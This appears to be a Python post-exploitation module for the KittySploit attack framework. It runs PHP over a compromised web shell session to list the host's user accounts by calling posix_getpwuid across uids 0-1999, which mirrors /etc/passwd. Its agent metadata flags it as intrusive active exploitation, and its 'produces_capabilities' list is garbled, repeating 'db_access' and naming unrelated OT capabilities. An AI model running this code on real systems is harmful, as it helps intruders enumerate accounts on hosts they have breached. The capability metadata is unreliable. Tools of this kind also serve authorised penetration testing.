from kittysploit import *
from core.framework.failure import ProcedureError, FailureType

class Module(Post):

	__info__ = {
		"name": "List all users from /etc/passwd",
		"description": "List all users from /etc/passwd",
		"author": "KittySploit Team",
		"arch": Arch.PHP,
		"tags": ["php"],
		"session_type": SessionType.PHP,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}	
		
	def run(self):
		try:
			result = self.cmd_execute("""
if(is_callable('posix_getpwuid')) 
{ 
	for($n=0; $n<2000;$n++) 
	{ 
		$uid = @posix_getpwuid($n); 
		if ($uid) 
			echo join(':',$uid).PHP_EOL; 
	}
}
""")
			if result:
				print_info(result)
				return True
			else:
				raise ProcedureError(FailureType.NotAccess, "No user information found or posix_getpwuid not available")
		except ProcedureError:
			# Re-raise ProcedureError as-is
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error executing PHP code: {e}")
